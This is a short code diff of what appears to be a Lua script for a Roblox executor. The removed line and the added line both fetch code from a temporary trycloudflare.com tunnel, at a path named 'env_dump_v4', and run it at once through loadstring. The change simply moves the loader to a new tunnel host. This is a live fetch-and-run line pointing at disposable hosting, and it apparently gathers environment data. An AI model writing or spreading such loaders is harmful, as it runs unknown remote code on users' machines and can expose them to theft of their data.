@@ -20,4 +20,4 @@ pcall(function()
     end
 end)
 
-loadstring(game:HttpGet("https://water-municipal-plans-educational.trycloudflare.com/env_dump_v4" .. "?executor=" .. executorName))()
+loadstring(game:HttpGet("https://new-relying-hiv-voltage.trycloudflare.com/env_dump_v4" .. "?executor=" .. executorName))()
